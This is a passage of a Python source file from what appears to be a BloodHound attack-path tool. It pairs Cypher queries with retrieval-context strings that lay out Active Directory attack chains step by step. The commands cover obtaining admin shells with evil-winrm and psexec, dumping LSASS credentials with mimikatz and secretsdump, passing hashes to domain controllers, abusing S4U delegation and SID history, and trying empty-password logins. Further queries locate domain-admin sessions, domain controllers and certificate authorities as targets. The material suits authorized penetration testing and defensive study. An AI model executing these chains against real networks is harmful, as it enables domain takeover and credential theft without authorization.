        "rag_context": """CREDENTIAL HARVESTING — ADMIN ACCESS + PRIVILEGED SESSION:

This finding identifies non-admin users who have local administrator access on a computer
where a privileged user (Domain Admin, Enterprise Admin) has an active session. This is
the #1 real-world lateral movement technique in penetration tests.

ATTACK CHAIN:

Step 1 — GAIN LOCAL ADMIN SHELL ON TARGET COMPUTER:
   $ evil-winrm -i {computer}.{domain} -u {source} -p '<PASSWORD>'
   OR: impacket-psexec {domain}/{source}:<PASSWORD>@{computer}.{domain}

Step 2 — DUMP CREDENTIALS FROM MEMORY:
   $ mimikatz # privilege::debug
   $ mimikatz # sekurlsa::logonpasswords
   OR: impacket-secretsdump {domain}/{source}:<PASSWORD>@{computer}.{domain}

Step 3 — AUTHENTICATE AS THE PRIVILEGED USER:
   $ impacket-psexec -hashes :<NT_HASH> {domain}/{session_user}@DC.{domain}
   OR: evil-winrm -i DC.{domain} -u {session_user} -H <NT_HASH>

TOOLS: evil-winrm, impacket-secretsdump, mimikatz, impacket-psexec
MITRE: T1003.001 (OS Credential Dumping: LSASS Memory)"""
    },

    # ===========================================
    # SID History Abuse
    # ===========================================
    {
        "name": "SID History Abuse - Cross-Domain Privilege Escalation",
        "description": "Principals with SID History entries pointing to privileged accounts in other domains — enables cross-domain impersonation",
        "cypher": """MATCH p=(n)-[:HasSIDHistory]->(target)
RETURN p
LIMIT 20""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["HasSIDHistory"],
        "rag_context": """SID HISTORY ABUSE — CROSS-DOMAIN PRIVILEGE ESCALATION:

This finding identifies principals whose SID History contains the SID of a privileged
account in another domain. When a Kerberos ticket is issued, ALL SIDs from the SID
History are included in the PAC — granting access as that privileged account.

ATTACK CHAIN:

Step 1 — VERIFY SID HISTORY:
   $ bloodyAD -d {domain} -u {user} -p '<PASSWORD>' --host DC.{domain} get object '{source}' --attr sIDHistory

Step 2 — AUTHENTICATE TO THE TARGET DOMAIN:
   $ impacket-psexec {target_domain}/{source}:<PASSWORD>@DC.{target_domain}

Step 3 — IF SID HISTORY POINTS TO DA:
   $ impacket-secretsdump {target_domain}/{source}:<PASSWORD>@DC.{target_domain}

TOOLS: bloodyAD, impacket, PowerShell AD Module
MITRE: T1134.005 (Access Token Manipulation: SID-History Injection)"""
    },

    # ===========================================
    # Constrained Delegation to Sensitive Services
    # ===========================================
    {
        "name": "Constrained Delegation to Sensitive Services",
        "description": "Principals with constrained delegation configured to sensitive services (CIFS, LDAP, HTTP) on DCs or high-value servers",
        "cypher": """MATCH p=(n)-[:AllowedToDelegate]->(c:Computer)
WHERE (n.enabled = true OR n:Computer)
AND (c.unconstraineddelegation = true OR c.isdc = true
     OR c.name STARTS WITH 'DC.' OR c.name STARTS WITH 'DC0' OR c.name STARTS WITH 'DC1')
RETURN p
LIMIT 50""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["AllowedToDelegate"],
        "rag_context": """CONSTRAINED DELEGATION TO SENSITIVE SERVICES:

This finding identifies accounts with constrained delegation configured to services
on Domain Controllers or high-value servers. This enables S4U2Self + S4U2Proxy attacks
to impersonate any user (including Domain Admins) to the delegated service.

ATTACK CHAIN:

Step 1 — ENUMERATE DELEGATION CONFIGURATION:
   $ bloodyAD -d {domain} -u {user} -p '<PASSWORD>' --host DC.{domain} get object '{source}' --attr msDS-AllowedToDelegateTo

Step 2 — REQUEST SERVICE TICKET VIA S4U:
   $ impacket-getST -spn '{delegated_spn}' -impersonate Administrator -dc-ip DC.{domain} '{domain}/{source}:<PASSWORD>'

Step 3 — USE THE TICKET:
   $ export KRB5CCNAME=Administrator.ccache
   $ impacket-psexec -k -no-pass '{domain}/Administrator@{target}.{domain}'

TOOLS: impacket-getST, impacket-psexec, Rubeus s4u
MITRE: T1550.003 (Use Alternate Authentication Material: Pass the Ticket)"""
    },

    # ===========================================
    # Cross-Domain Foreign Group Membership
    # ===========================================
    {
        "name": "Cross-Domain Foreign Group Membership",
        "description": "Users from one domain that are members of privileged groups in another domain — cross-trust privilege escalation",
        "cypher": """MATCH p=(n:User)-[:MemberOf*1..2]->(g:Group)
WHERE n.domain <> g.domain
AND (g.highvalue = true OR g.admincount = true
     OR g.objectid ENDS WITH '-512' OR g.objectid ENDS WITH '-519' OR g.objectid ENDS WITH '-544')
RETURN p
LIMIT 30""",
        "attack_type": "privilege_escalation",
        "priority": "Critical",
        "edges_used": ["MemberOf"],
        "rag_context": """CROSS-DOMAIN FOREIGN GROUP MEMBERSHIP:

This finding identifies users from one domain who are members of privileged groups
in a DIFFERENT domain. This is a cross-trust privilege escalation path.

ATTACK CHAIN:

Step 1 — COMPROMISE THE FOREIGN USER IN THEIR HOME DOMAIN:
   Use any applicable technique (Kerberoasting, password spray, ACL abuse, etc.)

Step 2 — AUTHENTICATE TO THE TARGET DOMAIN:
   $ impacket-psexec {target_domain}/{user}:<PASSWORD>@DC.{target_domain}
   OR: evil-winrm -i DC.{target_domain} -u {user} -p '<PASSWORD>'

Step 3 — VERIFY PRIVILEGED ACCESS:
   $ nxc smb DC.{target_domain} -u {user} -p '<PASSWORD>' --shares

TOOLS: impacket, evil-winrm, nxc
MITRE: T1078.002 (Valid Accounts: Domain Accounts)"""
    },

    # ===========================================
    # Password Not Required Accounts
    # ===========================================
    {
        "name": "Password Not Required Accounts",
        "description": "Accounts with PASSWD_NOTREQD flag - can have empty passwords for zero-effort compromise",
        "cypher": """MATCH p=(u:User)-[:MemberOf*0..2]->(g:Group)
WHERE u.passwordnotreqd = true
AND u.enabled = true
RETURN p
LIMIT 50""",
        "attack_type": "credential_access",
        "priority": "High",
        "edges_used": ["PasswordNotRequired"],
        "rag_context": """PASSWORD NOT REQUIRED - ZERO-EFFORT ACCOUNT COMPROMISE:

Accounts with the PASSWD_NOTREQD flag in UserAccountControl can have an empty password.
This is a critical misconfiguration that allows authentication without any credential.

COMMON CAUSES:
- Legacy accounts created before password policies
- Service accounts misconfigured during setup
- Accounts imported from other directories
- Migration artifacts

ATTACK CHAIN:
1. ENUMERATE PASSWD_NOTREQD ACCOUNTS:
   nxc ldap DC_IP -u attacker -p pass -M user-desc
   OR: Get-DomainUser -UACFilter PASSWD_NOTREQD -Properties samaccountname,memberof

2. ATTEMPT EMPTY PASSWORD LOGIN:
   nxc smb DC_IP -u {target} -p ''
   OR: evil-winrm -i DC_IP -u {target} -p ''

3. IF SUCCESSFUL:
   - Check group memberships for escalation paths
   - Check ACL outbound permissions
   - Use as pivot for further attacks

WHY THIS MATTERS:
- Zero effort required - no cracking, no exploitation
- Often overlooked in security assessments
- May have accumulated permissions over time
- Service accounts with PASSWD_NOTREQD often have admin rights

TOOLS: nxc, PowerView, ldapsearch, rpcclient
MITRE: T1078.002 (Valid Accounts: Domain Accounts)"""
    },
]

# Backward compatibility alias
CORE_STATIC_QUERIES = DISCOVERY_QUERIES


# =============================================================================
# TARGET DISCOVERY QUERIES
# =============================================================================
# These identify high-value targets for chain discovery.
# Run alongside DISCOVERY_QUERIES but return targets, not attack paths.

TARGET_DISCOVERY_QUERIES = [
    {
        "name": "High-Value Target Groups",
        "description": "Identify Domain Admins, Enterprise Admins, and other high-value groups as targets for chain discovery",
        "cypher": """MATCH (g:Group)
WHERE g.objectid ENDS WITH '-512'
   OR g.objectid ENDS WITH '-519'
   OR g.objectid ENDS WITH '-544'
   OR g.objectid ENDS WITH '-518'
RETURN g.name as name, labels(g) as labels, g.objectid as objectid
LIMIT 10""",
        "query_type": "target_discovery",
    },
    {
        "name": "Domain Objects",
        "description": "Identify all domain objects as high-value targets for chain discovery",
        "cypher": """MATCH (d:Domain)
RETURN d.name as name, labels(d) as labels, d.objectid as objectid
LIMIT 5""",
        "query_type": "target_discovery",
    },
    {
        "name": "Domain Controllers",
        "description": "Identify Domain Controllers as high-value targets",
        "cypher": """MATCH (c:Computer)
WHERE c.isdc = true OR c.unconstraineddelegation = true
RETURN c.name as name, labels(c) as labels, c.objectid as objectid
LIMIT 10""",
        "query_type": "target_discovery",
    },
    # DA-Session Computers — computers where DA/EA members have sessions
    {
        "name": "DA-Session Computers",
        "description": "Computers where Domain Admins have active sessions — credential harvesting targets",
        "cypher": """MATCH (u:User)-[:MemberOf*1..]->(g:Group)
WHERE g.objectid ENDS WITH '-512'
   OR g.objectid ENDS WITH '-519'
WITH u
MATCH (u)-[:HasSession]->(c:Computer)
WHERE c.isdc IS NULL OR c.isdc = false
RETURN DISTINCT c.name as name, labels(c) as labels, c.objectid as objectid
LIMIT 10""",
        "query_type": "target_discovery",
    },
    # Certificate Authorities — Golden Certificate targets
    {
        "name": "Certificate Authorities",
        "description": "Enterprise CAs as chain targets — compromising enables Golden Certificate attacks",
        "cypher": """MATCH (ca:EnterpriseCA)
RETURN ca.name as name, labels(ca) as labels, ca.objectid as objectid
LIMIT 5""",
        "query_type": "target_discovery",
    },
    # High-Value Computers (non-DC) — Exchange, ADFS, etc.
    {
        "name": "High-Value Computers",
        "description": "Computers marked as high-value by BloodHound — Exchange, ADFS, key infrastructure",
        "cypher": """MATCH (c:Computer)
WHERE c.highvalue = true
AND (c.isdc IS NULL OR c.isdc = false)
RETURN c.name as name, labels(c) as labels, c.objectid as objectid
LIMIT 10""",
        "query_type": "target_discovery",
    },
]
